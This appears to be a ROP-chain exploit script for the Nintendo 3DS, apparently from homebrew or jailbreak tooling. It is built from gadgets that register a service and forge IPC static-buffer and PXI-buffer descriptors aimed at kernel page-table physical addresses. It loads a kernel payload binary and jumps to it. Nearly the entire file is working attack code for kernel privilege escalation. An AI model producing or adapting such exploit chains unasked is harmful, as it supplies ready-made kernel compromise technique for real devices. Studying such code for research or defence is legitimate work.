include("../db/ropdb.py")
include("macros.py")

from constants import *
import os

APPMEMTYPE = 0x1FF80030

MAP_ADDR = 0x80000000

def IPC_Desc_StaticBuffer(size, buffer_id):
    return ((size << 14) | ((buffer_id & 0xF) << 10) | 0x2) & 0xFFFFFFFF

def IPC_Desc_PXIBuffer(size, buffer_id, is_read_only):
    type = 0x6 if is_read_only else 0x4
    return ((size << 8) | ((buffer_id & 0xF) << 4) | type) & 0xFFFFFFFF

#assume system version > SYSTEM_VERSION(2, 44, 6)
def KERNVA2PA(addr):
    return addr + 0xC0000000

STATIC_THREAD_BUFFER = ROP_BUFFER + ROP_BUFFER_SIZE

##################################### ROP ######################################

set_mem_offset(ROP_BUFFER)

PTM_SetInfoLEDPattern(yellow_led_pattern)
sleep(0xFFFFFFFF, 0x0)

#map space for the static thread buffer
map_mem(thread_buf_addr, STATIC_THREAD_BUFFER, 0x1000)

map_linear_mem(linear_buf_addr, 0, BLOB_LAYOUT_SIZE)
memset_load_dst(linear_buf_addr, 0, BLOB_LAYOUT_SIZE)

memcpy_load_dst_off(linear_buf_addr, BLOB_LAYOUT_CODE_OFFSET, \
    kernelhaxcode_3ds, os.path.getsize("../kernelhaxcode_3ds-full/kernelhaxcode_3ds-full.bin"))

#prepare L2 table
memcpy_load_dst_off(linear_buf_addr, BLOB_LAYOUT_L2TABLE_OFFSET,
    l2_table_AXIWRAM, l2_table_AXIWRAM_end - l2_table_AXIWRAM)

#osConvertVirtToPhys(*linear_buf_addr) i.e add (*linear_buf_addr - 0x10000000)
#because *linear_buf_addr >= 0x30000000

load_in_r0(linear_buf_addr)
POP_R1(0x100000000+BLOB_LAYOUT_CODE_OFFSET-0x10000000+0x5B6) # r1 = 0x5B6+BLOB_LAYOUT_CODE_OFFSET-0x10000000
add_word(ADDS_R0R0R1_POP_R4PC) # r0 = 0x5B6 + BLOB_LAYOUT_CODE_OFFSET + osConvertVirtToPhys(*linear_buf_addr)
add_word(0xDEADC0DE)
store_r0_to(l2_table_code_base_value)

load_in_r0(linear_buf_addr)
POP_R1(BLOB_LAYOUT_L2TABLE_OFFSET + l2_table_AXIWRAM_end - l2_table_AXIWRAM)
add_word(ADDS_R0R0R1_POP_R4PC)
add_word(0xDEADC0DE)
store_r0_to(cur_l2_table_code_ptr)

### Fill the second half of the l2 table (not precomputed) ###

#### LOOP START ####
put_label("l2_table_code_loop")

add_word(POP_R1PC)                      # r1 = base_value
put_label("l2_table_code_base_value")
add_word(0xDEADCAFE)

add_word(POP_R0PC)                      # r0 = cur_offset
put_label("cur_l2_table_code_offset")
add_word(0x0)

add_word(ADDS_R0R0R1_POP_R4PC)          # r0 = base_value + cur_offset
add_word(0xDEAC0DE)

add_word(POP_R4PC)                      # r4 = cur_ptr
put_label("cur_l2_table_code_ptr")
add_word(0xDEADCAFE)

add_word(STR_R0R4_POP_R4PC)             # *cur_ptr = base_value + cur_offset
add_word(0xDEADC0DE)

load_in_r0(cur_l2_table_code_ptr)
add_word(ADDS_R0R0_4_POP_R4PC)          # cur_ptr += 4
add_word(0xDEADC0DE)
store_r0_to(cur_l2_table_code_ptr)

load_in_r0(cur_l2_table_code_offset)
POP_R1(0x1000)
add_word(ADDS_R0R0R1_POP_R4PC)          # cur_offset += 0x1000
add_word(0xDEADC0DE)
store_r0_to(cur_l2_table_code_offset)

# if(cur_offset != BLOB_LAYOUT_CODE_SIZE) goto l2_table_code_loop
stack_pivot_if_r0_neq(BLOB_LAYOUT_CODE_SIZE, l2_table_code_loop)
#### LOOP END ####

#### CREATE SERVICE ####
SRV_RegisterService(server_handle_server, service_name, service_name_end - \
    service_name, 1)

#### WRITE STATIC BUFFERS DESCRIPTORS ####
SET_LR(NOP)
add_word(GET_THREAD_LOCAL_STORAGE)  # r0 = getThreadLocalStorage()
POP_R1(0x180)
add_word(ADDS_R0R0R1_POP_R4PC)      # r0 = getThreadLocalStorage()+0x180 = getThreadStaticBuffers()
add_word(0xDEADC0DE)

POP_R1(IPC_Desc_StaticBuffer(0, 0))
add_word(STR_R1R0_POP_R4PC)         # sbufs[0] = IPC_Desc_StaticBuffer(0, 0)
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(KERNVA2PA(0x1FFF8000) + (MAP_ADDR >> 20) * 4)
add_word(STR_R1R0_POP_R4PC)         # sbufs[1] = KERNVA2PA(0x1FFF8000) + (MAP_ADDR >> 20) * 4
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(IPC_Desc_StaticBuffer(0, 1))
add_word(STR_R1R0_POP_R4PC)         # sbufs[2] = IPC_Desc_StaticBuffer(0, 1)
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(KERNVA2PA(0x1FFFC000) + (MAP_ADDR >> 20) * 4)
add_word(STR_R1R0_POP_R4PC)         # sbufs[3] = KERNVA2PA(0x1FFF8000) + (MAP_ADDR >> 20) * 4
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(IPC_Desc_StaticBuffer(0x1000, 2))
add_word(STR_R1R0_POP_R4PC)         # sbufs[4] = IPC_Desc_StaticBuffer(0x1000, 2)
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(STATIC_THREAD_BUFFER)
add_word(STR_R1R0_POP_R4PC)         # sbufs[5] = STATIC_THREAD_BUFFER (actual static buffer)
add_word(0xDEADC0DE)

#### START CLIENT THREAD ####
svcCreateThread(thread_handle, client_rop)

#### START IPC ####
svcReplyAndReceive(reply_and_receive_idx, server_handles, 1, zero)
svcAcceptSession(server_handle_client, server_handle_server)

SET_LR(NOP)
add_word(GET_THREAD_LOCAL_STORAGE)
POP_R1(0x80)
add_word(ADDS_R0R0R1_POP_R4PC)
add_word(0xDEADC0DE)

POP_R1(0xFFFF0000)
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[0] = 0xFFFF0000
add_word(0xDEADC0DE)

svcReplyAndReceive(reply_and_receive_idx, server_handles, 2, zero)

SET_LR(NOP)
add_word(GET_THREAD_LOCAL_STORAGE)
POP_R1(0x80)
add_word(ADDS_R0R0R1_POP_R4PC)
add_word(0xDEADC0DE)

POP_R1(0x40)
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[0] = 0x40
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(0xD15EA5E5)
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[1] = 0xD15EA5E5
add_word(0xDEADC0DE)

svcReplyAndReceive(reply_and_receive_idx, server_handles, 2, server_handle_client)


add_word(SVC_EXITTHREAD)


#################################### SPACE #####################################
# enough space between both ropchains to avoid the client rop from overwriting the end of the server rop when calling functions
fill(0x1000, 0x0)

align(0x8)
################################## CLIENT ROP ##################################
put_label("client_rop")

SRV_GetServiceHandle(client_handle_server, service_name, \
    service_name_end - service_name)

load_in_r0(linear_buf_addr)         # r0 = layout
store_r0_to(cmdbuf_7)               # *cmdbuf_7 = layout (see cmdbuf_7 label)
POP_R1(BLOB_LAYOUT_L2TABLE_OFFSET+1)
add_word(ADDS_R0R0R1_POP_R4PC)      # r0 = layout->l2table | 1
add_word(0xDEADC0DE)
store_r0_to(cmdbuf_3)               # *cmdbuf_3 = layout->l2table | 1 (see cmdbuf_3 label)
store_r0_to(cmdbuf_5)               # *cmdbuf_5 = layout->l2table | 1 (see cmdbuf_5 label)

SET_LR(NOP)
add_word(GET_THREAD_LOCAL_STORAGE)  # r0 = getThreadLocalStorage()
POP_R1(0x80)
add_word(ADDS_R0R0R1_POP_R4PC)      # r0 = getThreadLocalStorage()+0x80 = getThreadCommandBuffer()
add_word(0xDEADC0DE)

POP_R1(0x10046)
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[0] = 0x10046
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(0x0)
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[1] = 0x0
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(IPC_Desc_PXIBuffer(4, 0, False))
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[2] = IPC_Desc_PXIBuffer(4, 0, False)
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

add_word(POP_R1PC)
put_label("cmdbuf_3")
add_word(0xDEADCAFE)
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[3] =
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(IPC_Desc_PXIBuffer(4, 1, False))
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[4] = IPC_Desc_PXIBuffer(4, 1, False)
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

add_word(POP_R1PC)
put_label("cmdbuf_5")
add_word(0xDEADCAFE)
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[5] =
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

POP_R1(IPC_Desc_PXIBuffer(BLOB_LAYOUT_SIZE, 2, False))
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[6] = IPC_Desc_PXIBuffer(BLOB_LAYOUT_SIZE, 2, false)
add_word(0xDEADC0DE)
add_word(ADDS_R0R0_4_POP_R4PC)      # incr sbufs offset
add_word(0xDEADC0DE)

add_word(POP_R1PC)
put_label("cmdbuf_7")
add_word(0xDEADCAFE)
add_word(STR_R1R0_POP_R4PC)         # cmdbuf[7] =
add_word(0xDEADC0DE)

svcSendSyncRequest(client_handle_server)

load_in_r0(APPMEMTYPE)
stack_pivot_if_r0_neq(0x6, o3ds_safe_firm)

SET_LR(NOP)
POP_R0(0x20000003)
POP_R1(0x00040138)
add_word(MAP_ADDR + 0x80000)
add_word(SVC_EXITTHREAD)

put_label("o3ds_safe_firm")
SET_LR(NOP)
POP_R0(0x00000003)
POP_R1(0x00040138)
add_word(MAP_ADDR + 0x80000)
add_word(SVC_EXITTHREAD)

################################## VARIABLES ###################################

put_label("server_handles")
put_label("server_handle_server")
add_word(0xDEADC0DE)
put_label("server_handle_client")
add_word(0xBABE1234)

put_label("client_handle_server")
add_word(0xDEADC0DE)

put_label("thread_handle")
add_word(0xDEADCAFE)

put_label("reply_and_receive_idx")
add_word(0xDEADDEAF)

put_label("thread_buf_addr")
add_word(0x0)

put_label("linear_buf_addr")
add_word(0x0)

put_label("zero")
add_word(0x0)


##################################### DATA #####################################

put_label("yellow_led_pattern")
add_byte(0x10)
add_byte(0x0)
add_byte(0x0)
add_byte(0x0)
for i in range(32*2):
    add_byte(0xFF)
for i in range(32):
    add_byte(0x0)

put_label("l2_table_AXIWRAM")
for offset in range(0, 0x80000, 0x1000):
    add_word((0x1FF80000 + offset) | 0x432)
put_label("l2_table_AXIWRAM_end")

put_label("service_name")
add_ascii("nba::yoh")
put_label("service_name_end")

put_label("kernelhaxcode_3ds")
incbin("../kernelhaxcode_3ds-full/kernelhaxcode_3ds-full.bin")
